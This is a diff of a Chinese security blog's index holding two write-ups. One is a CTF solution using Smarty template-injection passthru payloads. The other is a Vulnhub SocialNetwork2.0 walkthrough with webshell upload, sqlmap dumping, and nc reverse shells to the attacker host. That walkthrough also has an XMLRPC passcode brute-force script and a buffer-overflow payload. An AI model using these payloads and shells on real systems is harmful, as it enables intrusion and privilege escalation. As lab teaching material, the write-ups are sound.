+<p>将代码复制出来： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);              </span><br><span class="line">              </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>发现关键词<code>smarty</code>。 # 解题 本题已知模板引擎为SSTI，那么接下来就应该判断以下版本 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
+<p>版本为3.1。</p>
+<p>那么<a href="https://hdfzzf.icu/2022/04/05/Smarty模板注入/">Smarty模板注入</a>中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。</p>
+<h2 id="命令执行">命令执行</h2>
+<p>查找flag的路径： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
+<p>根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。</p>
+<p>接着需要读取flag（注意cat被过滤了）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
+<h2 id="if标签">{if}标签</h2>
+<p>其实和命令执行没什么不同。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Smarty</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pickle 库</title>
     <url>/2022/01/30/pickle%20%E5%BA%93/</url>
     <content><![CDATA[<p>pickle 库的简单使用。</p>
@@ -999,37 +1030,6 @@
       <tags>
         <tag>python</tag>
         <tag>pickle</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bugku_聪明的php</title>
-    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
-    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/198.html</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境获得一句话提示： &gt;pass a parameter and maybe the flag file's filename is random :&gt;</p>
-<p>随便给一个参数，得到如下界面：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
-<p>将代码复制出来： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);              </span><br><span class="line">              </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>发现关键词<code>smarty</code>。 # 解题 本题已知模板引擎为SSTI，那么接下来就应该判断以下版本 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
-<p>版本为3.1。</p>
-<p>那么<a href="https://hdfzzf.icu/2022/04/05/Smarty模板注入/">Smarty模板注入</a>中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。</p>
-<h2 id="命令执行">命令执行</h2>
-<p>查找flag的路径： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
-<p>根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。</p>
-<p>接着需要读取flag（注意cat被过滤了）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
-<h2 id="if标签">{if}标签</h2>
-<p>其实和命令执行没什么不同。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>Smarty</tag>
       </tags>
   </entry>
   <entry>
@@ -2258,6 +2258,215 @@
         <tag>MySQL提取</tag>
         <tag>shell升级</tag>
         <tag>BP自动替换</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第5周：Vulvhub SocialNetwork2.0 Writeup</title>
+    <url>/2022/04/06/%E7%AC%AC5%E5%91%A8%EF%BC%9AVulvhub%20SocialNetwork2.0%20Writeup/</url>
+    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第5周，该靶机难度困难，涉及到二进制（不会！）。这个靶机的难点就是在缓冲区溢出漏洞。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/">social_network_2.0</a></p>
+<p>难度：Hard</p>
+<p>虚拟机软件：Virtual Box</p>
+<p>目标：获得root权限</p>
+<p><strong>涉及的攻击方法</strong>：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>SQL注入</li>
+<li>文件上传</li>
+<li>蚁剑上线</li>
+<li>CVE利用</li>
+<li><strong>XMLRPC命令执行</strong></li>
+<li>*动态调试</li>
+<li>漏洞利用代码编写**</li>
+</ul>
+<h1 id="渗透">渗透</h1>
+<p>kali：10.0.2.4</p>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203809.png" /></p>
+<p>靶机IP为：10.0.2.8</p>
+<h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.8</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203853.png" /></p>
+<p>靶机开了2个端口：80，8000</p>
+<h2 id="端口服务发现">端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.8</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204014.png" /></p>
+<ol type="1">
+<li>80和8000端口的服务都是http</li>
+<li>靶机系统是Ubuntu</li>
+<li>80端口上的CMS是Apache，版本为2.4.29</li>
+<li>8000端口上的服务是BaseHTTPServer，版本为0.3</li>
+<li>靶机上有python2的环境</li>
+</ol>
+<h2 id="访问http服务">访问http服务</h2>
+<p>首先访问8000端口，发现提示信息 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error code 501.</span><br><span class="line">Message: Unsupported method (&#x27;GET&#x27;).</span><br><span class="line">Error code explanation: 501 = Server does not support this operation. </span><br></pre></td></tr></table></figure></p>
+<p>简而言之就是服务端不接受GET请求方式。因此，我们换请求方式，但是在尝试了所有请求方式后发现都不行。这个端口的思路到此就断了。</p>
+<p>那访问80端口，发现是一个登录界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204512.png" /></p>
+<p>首先尝试万能密码，但被提示<code>invalid email format</code>。因此，就需要换一个思路。<strong>注意到该网址有一个<code>Sign Up</code>功能，因此，接下来应该先注册一个账号，然后收集登陆进去的信息</strong>。这是非常重要的思路！</p>
+<p>进去之后发现这是一个类似微博一样的功能，注意到除了我之外还有两个用户<code>admin admin</code> 和<code>testuser testuers</code>。还注意到有一个<strong>搜索框</strong>以及头像可以<strong>上传文件</strong>！</p>
+<h2 id="蚁剑上线">蚁剑上线</h2>
+<p>先测试上传文件功能点。上传一个一句话，然后鼠标右键头像，打开链接，发现成功打开，并且得到文件的路径。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205340.png" /></p>
+<p>直接使用蚁剑连接。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205811.png" /></p>
+<h2 id="sql注入">SQL注入</h2>
+<p>测试刚刚那个搜索框，先输入一个单引号，发现报错了，因此，存在SQL注入，并且数据库为MySQL</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405210036.png" /></p>
+<p>直接用sqlmap <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sqlmap -r r.txt -p query <span class="comment"># 其中r.txt保存的是搜索的请求数据包</span></span><br><span class="line">2. sqlmap -r r.txt -p query --dbs</span><br><span class="line">3. sqlmap -r r.txt -p query -D socialnetwork --tables</span><br><span class="line">4. sqlmap -r r.txt -p query -D socialnetwork -T users --columns</span><br><span class="line">5. sqlmap -r r.txt -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure></p>
+<p>成功获得邮箱和密码的hash值，一般密码都是md5加密的，因此解密之后得到下表：</p>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">email</th>
+<th style="text-align: center;">encryPasswd</th>
+<th style="text-align: center;">passwd</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><code>admin@localhost.com</code></td>
+<td style="text-align: center;">21232f297a57a5a743894a0e4a801fc3</td>
+<td style="text-align: center;">admin</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"><code>21232f297a57a5a743894a0e4a801fc3</code></td>
+<td style="text-align: center;">5d9c68c6c50ed3d02a2fcf54f63993b6</td>
+<td style="text-align: center;">testuser</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"><code>hdfzzf@123.com</code></td>
+<td style="text-align: center;">249abd700757d98f77fa6ff4f0c2a750</td>
+<td style="text-align: center;">hdfzzf</td>
+</tr>
+</tbody>
+</table>
+<p>此时就可以使用admin的邮箱和密码登录。</p>
+<p>发现一条靶机系统上有一个<code>monitor.py</code>脚本。其他并没有什么特别的。</p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>蚁剑获得的shell功能不够，因此需要用nc反弹或者python，然后进行shell升级。</p>
+<p>kali先监听3333端口，然后蚁剑shell上执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 3333 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
+<p>然后进行shell升级，和之前一样，这里不多赘述</p>
+<h2 id="cve-2021-3493提权">CVE-2021-3493提权</h2>
+<p>Ubuntu有一个CVE-2021-3493，可以直接进行本地提权。</p>
+<p>漏洞利用下载地址：<a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a></p>
+<p>下载完之后，编译之后发送到靶机。然后再执行该exp即可。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214049.png" /></p>
+<p>成功提权。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214121.png" /></p>
+<p>这样子似乎很快，但是这台靶机是2020年出的，而该漏洞是2021年爆出的，因此，回归当年的环境，用别的方法提权。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>下面命令可以获得具体发行版本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406110128.png" /></p>
+<p>发现与<code>/bin/bahs</code>有关的用户： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214351.png" /></p>
+<p>发现两个用户。这里其他信息收集的过程就不多赘述了。</p>
+<p>记得刚刚有一个脚本<code>monitor.py</code>，在<code>/home/socnet</code>目录下找到了它，查看源码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure></p>
+<p>这里有一个技术：<a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">XMLRPC</a></p>
+<p>（这个脚本也解释了为什么在访问8000端口的时候不接受所有的请求方式！）</p>
+<p>简单来说就是客户端可以通过该技术调用服务端提供的函数。而查看进程发现，该脚本处于运行状态。通过代码审计发现，靶机作为服务端启动服务，并且有多个函数，注意到最后一个<code>secure_cmd</code>，只要满足条件，就能够执行任意代码。我们并不知道<code>debugging_pass</code>值是多少，这是通过随机函数在脚本刚执行时随机的一个值，但是也就几千个，直接爆破即可。</p>
+<h2 id="第一次权限提升xmlrpc命令执行">第一次权限提升——XMLRPC命令执行</h2>
+<p>编写如下脚本爆破<code>debugging_pass</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">		r = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&quot;whoami&quot;</span>, i))</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">		    <span class="built_in">print</span>(r)</span><br><span class="line">		    <span class="built_in">print</span>(<span class="string">&quot;the value of debugging_pass is %d&quot;</span> % i)</span><br><span class="line">		    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405221433.png" /></p>
+<p>得到<code>debugging_pass=5166</code>，并且发现执行的结果是<code>socnet</code>。如果利用该脚本反弹shell，那么获得的shell就是<code>socnet</code>的。</p>
+<p>此时再次执行nc反弹 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f&quot;</span></span><br><span class="line">    p = <span class="number">5166</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the script is running:&quot;</span>)</span><br><span class="line">    proxy.secure_cmd(cmd, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405222307.png" /></p>
+<p>成功提权到<code>socnet</code>。然后再次进行shell升级。</p>
+<h2 id="第二次权限提升缓存区溢出漏洞">第二次权限提升——缓存区溢出漏洞</h2>
+<p>（我不懂，没学过，跟着视频来的）</p>
+<p>首先，在<code>socnet</code>的家目录下有三个文件（目录），并且<code>add_record</code>具有SUID，所有者为root。因此，想办法通过该可执行文件获得root权限。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405223223.png" /></p>
+<p>注意到<code>peda</code>，这是一款动态调试的工具。<a href="https://www.jianshu.com/p/283b5466684b">peda信息</a></p>
+<p>思路：动态调试<code>add_record</code>，找到缓冲区溢出漏洞，利用漏洞</p>
+<h3 id="动态调试">动态调试</h3>
+<p>首先执行该程序，发现需要依次填写多个信息：</p>
+<ol type="1">
+<li>Employee Name</li>
+<li>Years worked</li>
+<li>Salary</li>
+<li>Ever got in trouble?</li>
+<li>如果上个问题答案为1，则填写Explain；否则程序结束。</li>
+</ol>
+<p>输入下述命令开始动态调试： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -q ./add_record</span><br><span class="line"></span><br><span class="line">再次输入r才可以执行该程序。</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>如何找缓冲去漏洞呢？首先就是生成一长串的字符A，然后找到所有的数据提交点，每次测试一个提交点。比如上述有5个提交点，第一次将生成的字符串输入到Employee Name，其他提交点正常传入数据，以此类推。 这样就可以通过查看其他寄存器是否充满字符A来判断是否存在缓冲区漏洞。</p>
+</blockquote>
+<p>这里做一组对比，第一组测试<code>Employee Name</code>：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224330.png" /></p>
+<p>直接退出程序，说明该提交点并不存在缓冲区漏洞。</p>
+<p>第二组测试<code>Explain</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224520.png" /></p>
+<p>可以看到许多寄存器都是A，证明该提交点存在缓冲区溢出漏洞。<strong>注意寄存器<code>EIP</code>，该寄存器存放的是CPU执行的下一条指令的存放地址</strong>。</p>
+<p>接着，需要判断EIP中的4个A是提交的字符串中的哪几个，可以先不断减少字符A的个数，然后提交，直到找到。也可以生成特征字符串（每4个为一个子串，在整个字符串中。子串是唯一的） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create [len] # 长度至少要保证EIP中充满A</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225135.png" /></p>
+<p>然后利用命令自动查找位置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern search</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225310.png" /></p>
+<p>EIP的第一个字符在特征字符串的位置是62（位置从0开始），因此，EIP在字符串中的位置就是62，63，64，65四个位置。可以验证一下，生成如下字符串：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225456.png" /></p>
+<p>然后带入进去，如果此时EIP内是BCDE，则代表位置正确。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225548.png" /></p>
+<p>位置正确</p>
+<h3 id="查看汇编代码">查看汇编代码</h3>
+<h4 id="该程序的汇编代码">该程序的汇编代码</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230105.png" /></p>
+<p>尖括号里面是函数，带<code>@plt</code>的是自带的函数，不带的则是自己编写的函数。<code>call</code>代表调用。最前面的16进制数字表示该指令存放的内存地址。</p>
+<p>可以通过打断点调试，测试函数的功能（以<code>0x080487ea</code>为例，断点要打在这句话的前一个位置）。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break *0x080487e7</span><br><span class="line">r</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230637.png" /></p>
+<p>当输入1之后程序停止了，输入<code>s</code>单步运行，然后正好到我们要测试的函数<code>getchar@plt</code>，说明这里的作用就是获得我们的输入。</p>
+<p>注意到这里有一个<code>vuln</code>的函数。可以利用<code>info func</code>查看该程序的所有函数，发现里面有<code>system@plt, setuid@plt, vuln, backdoor</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231236.png" /></p>
+<h4 id="vuln函数的汇编代码">vuln函数的汇编代码</h4>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231350.png" /></p>
+<p>注意<code>strcpy@plt</code>，这个函数存在着漏洞。<a href="https://stackoverflow.com/questions/48356481/exploiting-strcpy-in-c-with-buffer-overflow">strcpy缓冲区溢出漏洞</a></p>
+<p>因此，之前测试的缓冲区溢出漏洞出现的原因就是主函数调用<code>vuln</code>，然后<code>vuln</code>又调用了该函数造成的。</p>
+<h4 id="backdoor函数的汇编代码">backdoor函数的汇编代码</h4>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231651.png" /></p>
+<p>注意到这里先运行了<code>setuid</code>，然后运行了<code>system</code>，也就是此时的<code>system</code>可能是以root权限运行的。那么此时就需要知道<code>system</code>执行了什么命令。</p>
+<p><strong>复制<code>backdoor</code>第一条指令的地址。然后利用缓冲区溢出的漏洞，将该地址放到EIP中，这样，随着程序的执行，就会将<code>backdoor</code>函数调用</strong>。</p>
+<blockquote>
+<p>可以生成一个文件，把每一个问题的回答都写入，回答之间用换行符分割，然后 r &lt; filename，自动化执行。</p>
+</blockquote>
+<p>第一步，生成一个文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import struct; print(&#x27;h\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> &gt; payload</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103054.png" /></p>
+<p>（观察前面注入BCDE的时候，EIP内容是BCDE，但是16进制是0x45444342，可以看到顺序被颠倒了，因此，我们写入backdoor函数的第一条指令的地址的时候也需要颠倒以下写进去，所以使用<code>struct.pack</code>）</p>
+<p>第二步，执行命令 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r &lt; payload</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103200.png" /></p>
+<p>注意下几句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[New process 4825]</span><br><span class="line">process 4825 is executing new program: /bin/dash</span><br><span class="line">[New process 4826]</span><br><span class="line">process 4826 is executing new program: /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>当我们往<code>EIP</code>写入<code>backdoor</code>指令后，该程序就会自动调用<code>backdoor</code>函数，结果如上。如果没有调用该函数，那么就不会出现上述结果。因此，<code>backdoor</code>函数执行了<code>/bin/bash</code>和<code>/bin/dash</code>，并且在该程序执行完毕之后退出。</p>
+<p>因此，我们只需要正常的执行程序，然后在Explain处将<code>backdoor</code>函数的第一条指令写入到<code>EIP</code>寄存器即可获得root权限。</p>
+<p>第三步，动态调试验证 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break vuln </span><br></pre></td></tr></table></figure></p>
+<p>单步执行到<code>backdoor</code>函数之后就需要慢点操作了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104348.png" /></p>
+<p>单步执行到<code>setuid</code>函数。</p>
